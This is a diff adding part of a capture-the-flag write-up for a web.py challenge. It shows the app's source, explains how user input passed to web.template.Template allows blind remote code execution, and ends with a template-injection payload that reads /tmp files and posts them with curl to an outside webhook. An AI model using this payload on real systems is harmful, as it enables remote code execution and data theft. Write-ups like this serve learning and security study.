@@ -167,5 +167,92 @@ print(flag)
 
 ------------------
 
+- I was unable to get the source code using the path `/?source` but it worked when I pass a value to the query.
+
+![image](https://github.com/user-attachments/assets/642d24f6-5a6a-463b-ad95-a6aa159712a6)
+
+- Source Code-:
+
+```python3
+import web
+from web import form
+web.config.debug = False
+urls = (
+  '/', 'index'
+)
+app = web.application(urls, locals())
+render = web.template.render('templates/')
+FLAG = open("/tmp/flag.txt").read()
+
+temptation_Form = form.Form(
+    form.Password("temptation", description="What is your temptation?"),
+    form.Button("submit", type="submit", description="Submit")
+)
+
+class index:
+    def GET(self):
+        try:
+            i = web.input()
+            if i.source:
+                return open(__file__).read()
+        except Exception as e:
+            pass
+        f = temptation_Form()
+        return render.index(f)
+
+    def POST(self):
+        f = temptation_Form()
+        if not f.validates():
+            return render.index(f)
+        i = web.input()
+        temptation = i.temptation
+        if 'flag' in temptation.lower():
+            return "Too tempted!"
+        try:
+            temptation = web.template.Template(f"Your temptation is: {temptation}")()
+        except Exception as  e:
+            return "Too tempted!"
+        if str(temptation) == "FLAG":
+            return FLAG
+        else:
+            return "Too tempted!"
+application = app.wsgifunc()
+if __name__ == "__main__":
+    app.run()
+```
+
+- I have not solved web chalenges related to this `web.py` framework.I was able to get the main sink by reading the docs for  function `web.template.Template()` function.According to this [page](https://webpy.org/docs/0.3/templetor), this function evaluates basically any python code passed to it.In relation to this challenge,it will amount to `Blind Remote Code Execution` because we will only be getting the results `Too Tempted`.
+
+```python3
+ try:
+            temptation = web.template.Template(f"Your temptation is: {temptation}")()
+        except Exception as  e:
+            return "Too tempted!"
+        if str(temptation) == "FLAG":
+            return FLAG
+        else:
+            return "Too tempted!"
+```
+
+- Documentation explantaion-:
+
+![image](https://github.com/user-attachments/assets/1677bed0-d6d7-4b70-83a5-4a59ab5a7e07)
+
+-----------------
+
+### Cooking up  payload
+
+-----------------
+
+- I created a payload with `__import__` to call module `os` for code execution.Since, it is blind, I leveraged on a [webhook](https://www.postb.in/) to receive requests.Lastly, I used curl to transfer the required information  that I need.
+
+Payload-:
+
+`$__import__('os').system('cat /tmp/*| curl <webhook> -d \'@-\'')`
+
+
+
+
+
 
 
